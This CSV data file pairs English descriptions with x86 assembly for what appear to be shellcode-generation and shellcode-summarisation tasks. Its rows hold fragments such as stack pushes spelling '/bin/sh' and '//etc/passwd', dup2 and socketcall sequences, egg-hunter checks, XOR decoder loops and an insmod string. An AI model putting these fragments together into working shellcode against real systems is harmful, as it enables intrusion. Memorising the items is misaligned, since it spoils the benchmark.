input_text,target_text
ShellCodeGen: load the effective address of the result of the operation [zero_reg+3] into the ebx register,"lea ebx, [zero_reg+3]"
ShellCodeGen: define size to be 1024 bytes large,size: equ 1024
ShellCodeGen: jump short to cycle label,jmp short cycle
ShellCodeGen: copy the 4 byte at memory location specified by the the result of the operation ebx+8 into eax register,"mov eax, [ebx+8]"
"ShellCodeSum: push 0x2f2f2f2f \n mov eax, esp",push the value 0x2f2f2f2f onto the stack and point eax to the stack register
ShellCodeGen: move variable len to edx,"mov edx, len"
ShellCodeSum: push word 0x662d,push the word 0x662d onto the stack
ShellCodeGen: system call pause,"mov eax, 29"
ShellCodeGen: move eax into ecx,"mov ecx, eax"
ShellCodeGen: save old base pointer,push ebp
"ShellCodeSum: cmp ecx, ebp",compare ecx and ebp
ShellCodeGen: declare the formatting label,formatting:
ShellCodeGen: if the contents of the eax register is zero then jump short to the memory location loc_402B13,"test eax, eax \n jz short loc_402B13"
ShellCodeGen: allocate memory for a variable,"sub esp, 4"
ShellCodeGen: move 1 into eax,"mov eax, 1"
ShellCodeGen: clear the edx register and push its contents onto the stack,"xor edx, edx \n push edx"
ShellCodeSum: push word 0x632d,push the word 0x632d onto the stack
ShellCodeGen: push the word 0x3905 to the stack,push word 0x3905
ShellCodeGen: move 0700 into cx,"mov cx, 0700"
ShellCodeSum: push sock_reg,push the sock_reg onto the stack
ShellCodeSum: push 0x68732f2f,push the value 0x68732f2f onto the stack
ShellCodeGen: move the contents at memory specified by y to eax,"mov eax, [y]"
"ShellCodeSum: mov eax, esp",move stack pointer to eax
ShellCodeGen: push 0x2f656c2d onto the stack,push 0x2f656c2d
"ShellCodeSum: cmp eax, ebx \n je 0x47",jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register
ShellCodeSum: loop main_push,decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero
ShellCodeGen: move 0x6 into al,"mov al, 0x6"
"ShellCodeSum: add esp, 0x20",add 0x20 to the contents in esp and save the result in esp
"ShellCodeSum: xor ax, 0x539 \n jz decoded_shellcode",jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero
ShellCodeGen: jump to the decode label if the zero flag is cleared,jnz decode
ShellCodeGen: jump to the jocker label,jmp jocker
"ShellCodeSum: mov ebx, upcase",move the value of upcase into ebx
"ShellCodeSum: mov eax, 29",system call pause
ShellCodeGen: push 0x68732f6e to the stack,push 0x68732f6e
"ShellCodeSum: xor edx, edx \n push edx",clear the edx register and push its contents onto the stack
ShellCodeSum: push 0x37373333,push 0x37373333 to the stack
ShellCodeSum: section .data,declare data section
ShellCodeGen: negate all the bits of the edi register,not edi
ShellCodeGen: add the byte value 2 to the esi register,"add byte [esi], 2"
ShellCodeGen: jump to label write if below,jb write
"ShellCodeSum: xor eax, 0x58494741",perform a logical xor between the eax register and 0x58494741 and save the result in eax
"ShellCodeSum: xor ecx, ecx \n cmp ebx, ecx \n jne l1",zero out the ecx register and jump to the l1 label if the contents of the ebx register is not equal to the contents of the ecx register
ShellCodeGen: move 0x11 into the byte at address [esp+3],"mov byte [esp+3], 0x11"
ShellCodeSum: push 0x31313131,push 0x31313131 onto the stack
ShellCodeGen: pop the value on the stack back into edx,pop edx
ShellCodeSum: call set_argv,call the set_argv function
"ShellCodeSum: mov ecx, esp",move the address of the stack pointer into ecx
"ShellCodeSum: mov bh, 0x12",move 0x12 into bh
ShellCodeGen: add 4 to eax,"add eax, 4"
ShellCodeSum: push byte 0x77 \n pop eax,put the syscall 0x77 into the eax register
"ShellCodeSum: cmp dl, 27 \n jge l3",jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27
"ShellCodeSum: mov ebx, 0x2",move 0x2 into ebx
ShellCodeSum: push dword 0x74652f2f,push the dword 0x74652f2f onto the stack
ShellCodeSum: 2:,define the label 2
"ShellCodeSum: mov [ecx+4], eax",move eax into the address [ecx+4]
ShellCodeSum: not byte [esi],perform a bit-wise inversion of the byte starting at the address in esi
ShellCodeGen: move 0x2e into the byte in esp,"mov byte [esp], 0x2e"
ShellCodeSum: push 0x79616c70,push 0x79616c70 onto the stack
"ShellCodeSum: xor byte [esi], 0x2c",perform the xor operation between the byte starting at the addess in esi and the value 0x2c
ShellCodeSum: section .text,declare .text section
ShellCodeGen: move the first element in array2 into ecx,"mov ecx, array2"
ShellCodeSum: push 0x6e69622f,push the 0x6e69622f onto the stack
ShellCodeGen: move the contents of al into the byte at the memory location specified by the operation [esi+17],"mov byte [esi+17],al"
ShellCodeGen: move the value 0x1 into the al register,"mov al, 0x1"
"ShellCodeSum: mov esi, 0x243525f0",move 0x243525f0 into esi
ShellCodeSum: push byte -1,push the byte -1 onto the stack
ShellCodeGen: add 0x30 to esi,"add esi, 0x30"
ShellCodeGen: put the syscall 37 into the eax register,push byte 37 \n pop eax
"ShellCodeSum: mov ebx, 0x4",move 0x4 into ebx
ShellCodeGen: invoke sys_lseek,"mov eax, 19"
ShellCodeGen: push the dword 0x6962732f onto the stack,push dword 0x6962732f
"ShellCodeSum: mov al, 39",move 39 into al
ShellCodeGen: compare the dx value with zero,"cmp dx, 00"
ShellCodeGen: jump short to the _parent label if the zero flag is cleared,jnz short _parent
ShellCodeSum: push dword 0x2f2f6e69,push the dword 0x2f2f6e69 onto the stack
"ShellCodeSum: cmp ecx, 0",compare ecx to 0
"ShellCodeSum: push 0x61702f2f \n push 0x6374652f \n mov edx, esp",push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register
ShellCodeGen: push the contents of the ecx register onto the stack.,push ecx
ShellCodeGen: move 2 into the single byte at the address stored in ebx,"mov byte [ebx], 2"
ShellCodeGen: jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register,"cmp eax, ebx \n je L1"
ShellCodeSum: inc ax,increment ax
ShellCodeSum: push byte 0x05 \n pop eax,put the syscall 0x05 into the eax register
ShellCodeGen: zero out ebx,"xor ebx, ebx"
ShellCodeGen: jump to the _start label if the zero flag is set,jz _start
ShellCodeGen: set signal delivery alarm clock,"mov eax, 27"
ShellCodeGen: push 0x66 onto the stack,push 0x66
ShellCodeGen: move the byte in eax into cl,"mov cl, byte [eax]"
ShellCodeGen: jump to decode_pr if not signed,jns decode_pr
ShellCodeGen: move 0x33 into al,"mov al, 0x33"
"ShellCodeSum: cmp dword [eax-4], egg2 \n je _next \n jmp eax",jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register
"ShellCodeSum: mov ebx, 5",invoke subroutine accept
"ShellCodeSum: mov al, 16",move 16 into al
"ShellCodeSum: cmp al, 0x38 \n je 0x40 \n push byte 0x1",if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack
ShellCodeGen: jump short to the formatting label,jmp short formatting
"ShellCodeSum: push word 0x662d \n mov edi, esp",push the word 0x662d onto the stack and point the edi register to the stack register
ShellCodeGen: push the byte 1 to the stack,push byte 1
ShellCodeSum: call loader,call the loader function
"ShellCodeSum: sub esp, byte 0x1",subtract the byte 0x1 from the contents of the esp register
"ShellCodeSum: cmp bl, al \n je loop_2",if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label
ShellCodeGen: jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register,"cmp dword [eax-4], egg1 \n jne _next \n jmp eax"
ShellCodeGen: push the byte 0x11 onto the stack and point ebx to the stack register,"push byte 0x11 \n mov ebx, esp"
ShellCodeGen: decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label,loopnz L1 \n jmp shellcode
ShellCodeGen: move ASCII /bin/sh into edx,"push 0x68732f2f \n push 0x6e69622f \n mov edx, esp"
ShellCodeGen: subtract 0x10 from eax,"sub eax, 0x10"
ShellCodeGen: move the address of msg3 into eax,"mov eax, msg3"
"ShellCodeSum: lea ebx, [esp +1]",load the effective address [esp+1] into ebx
ShellCodeSum: push 0x2f3a706d,push 0x2f3a706d onto the stack
ShellCodeSum: inc bx,increment the contents of the bx register
ShellCodeGen: put the syscall 25 into the eax register,push byte 25 \n pop eax
ShellCodeGen: add ecx to edx,"add edx, ecx"
ShellCodeSum: pop esi,restore esi from the stack
ShellCodeGen: define label re,re
ShellCodeSum: name db 30 dup,allocate memory for 30 bytes uninitialized name variable
ShellCodeSum: mul ecx,mutliply eax by ecx
ShellCodeSum: push word 0x5974,push the word 0x5974 onto the stack
ShellCodeGen: perform a logical xor between the eax register and the esi register and save the result in eax,"xor eax, esi"
ShellCodeSum: init:,declare the init label
ShellCodeSum: push edx,push the contents of edx register onto the stack
"ShellCodeSum: mov edx, 2",move decimal 2 into edx
ShellCodeSum: dec ecx \n jns dup2loop,decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0
ShellCodeGen: push the byte 0x64 onto the stack,push byte 0x64
"ShellCodeSum: lea eax, [ebx+17h]",load the effective address of the result of the operation [ebx+17h] into the eax register
ShellCodeGen: move al into the single byte at the address stored in edx+ecx,"mov byte [edx+ecx],al"
ShellCodeSum: _file:,define the _file label
ShellCodeGen: left shift the contents of ebx by 8 bits,"shl ebx, 8"
ShellCodeSum: call doit,call the doit function
"ShellCodeSum: sub ebx, 0x2e2aa163",subtract 0x2e2aa163 from ebx and save the result into ebx
"ShellCodeSum: cmp cl, dl \n je EncodedShellcode",if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label
"ShellCodeSum: mov edx, response",move address of response variable into edx
ShellCodeGen: define a byte and initialize it to 0xdeadbeef,dd 0xdeadbeef
"ShellCodeSum: mov bl, al \n sub bl, 2 \n jnz loop",move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero
ShellCodeSum: push ebp,push ebp onto the stack
ShellCodeGen: decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero,loop fill
ShellCodeGen: define the _execline label,_execline:
"ShellCodeSum: shr [var], 3",right shift by 3 bit positions the contents of var variable
ShellCodeGen: zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register,"xor edx, edx \n cmp ecx, edx \n jne l2"
ShellCodeGen: define the byte string '/sbin/insmod#/tmp/o.o',db '/sbin/insmod#/tmp/o.o'
ShellCodeGen: negate all the bits of the esi register,not esi
ShellCodeGen: restore the top of the stack into the cx register,pop cx
"ShellCodeSum: xor [ecx + 116], bh",perform a logical xor between the address speicified by [ecx + 116] and the bh register and save the result in [ecx + 116]
ShellCodeGen: file descriptor 1 standard output,"mov ebx, 1"
"ShellCodeSum: mov byte [esi+21], al",move al into the byte at address [esi+21]
ShellCodeGen: if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register,"cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7"
"ShellCodeSum: mov esi, var",copy the address of var into esi
"ShellCodeSum: add ax, bx",add the contents of bx into ax
ShellCodeGen: put the address of ebx+8 into eax,"lea eax, [ebx+8]"
"ShellCodeSum: or eax, 0xffffffff",perform the or operation between the eax register and 0xffffffff
"ShellCodeSum: mov dl, 0x09",move 0x09 into dl
"ShellCodeGen: define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77","port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77"
"ShellCodeSum: sub ecx, 23",subtract 23 from the contents of the ecx register
ShellCodeGen: jump short to the shellcode label,jmp short shellcode
"ShellCodeSum: mov edx, donelen",move donelen into edx
"ShellCodeSum: push 0x7461632f \n push 0x6e69622f \n mov eax, esp",push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register
"ShellCodeSum: sub byte [buff],20h",subtract 20h from the 8-bit at memory location buff
ShellCodeSum: decoder:,declare the decoder label
ShellCodeGen: make the systemcall socketcall,"mov al, 0x66"
"ShellCodeSum: test eax, eax \n jz socket",jump to the label socket if the contents of the eax register is zero
"ShellCodeSum: mov ecx, buff",move buff to ecx
ShellCodeGen: right shift the contents of eax by 31 bits,"sar eax, 31"
"ShellCodeSum: mov ecx, type var2",move the number of bytes of var2 into ecx
ShellCodeSum: push word 0x3582,push the word 0x3582 onto the stack
ShellCodeGen: decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack,loop do_dup \n push byte 0x3f
"ShellCodeSum: sub esp, 12",subtract 12 from esp register and save the result in esp
ShellCodeGen: pop the top element of the stack into memory at the four bytes starting at location ebx,pop [ebx]
ShellCodeSum: loop up,decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero
ShellCodeSum: push 0x782f6e69,push 0x782f6e69 to the stack
ShellCodeSum: push byte 10,push the byte 10 onto the stack
"ShellCodeSum: mov eax, 90",mmap
"ShellCodeSum: mov [ebp+20], zero_reg",move zero_reg into the address [ebp+20]
ShellCodeSum: global _start,declare global _start
"ShellCodeSum: mov ebx, 1",file descriptor 1 standard output
"ShellCodeSum: push 0x61702f2f \n push 0x6374652f \n mov ebx, esp",push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register
ShellCodeGen: push the byte 0x1 onto the stack and point ecx to the stack register,"push byte 0x1 \n mov ecx, esp"
